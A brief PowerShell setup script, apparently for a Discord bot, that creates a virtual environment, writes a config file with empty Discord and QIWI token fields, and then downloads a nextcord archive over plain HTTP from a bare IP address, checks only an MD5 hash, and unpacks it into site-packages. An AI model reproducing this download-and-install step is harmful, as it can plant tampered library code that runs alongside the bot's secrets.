python -m venv Venv
.\Venv\Scripts\Activate.ps1
pip install -r requirements.txt

@"

discord_token: str = ""

qiwi_number: str = "" # for AuthPayTempCog

qiwi_token: str = "" # for AuthPayTempCog

cogs_add_on_ready: list[str] = [""]

test_guild_ids: list[int] = []

"@ | Out-File -FilePath "configuration.py"


$url = "http://84.252.74.222:9000/nextcord.zip"
$expectedHash = "b7a710cd995b244f7cf0f9165894900e"

Invoke-WebRequest -Uri $url -OutFile "nextcord.zip"

$actualHash = (Get-FileHash "nextcord.zip" -Algorithm MD5).Hash
if ($actualHash -ne $expectedHash) {
    Write-Host "Hash does not match, exiting..."
    Remove-Item "nextcord.zip"
    exit
}

Expand-Archive "nextcord.zip" -DestinationPath "Venv/lib/site-packages/"
Remove-Item "nextcord.zip"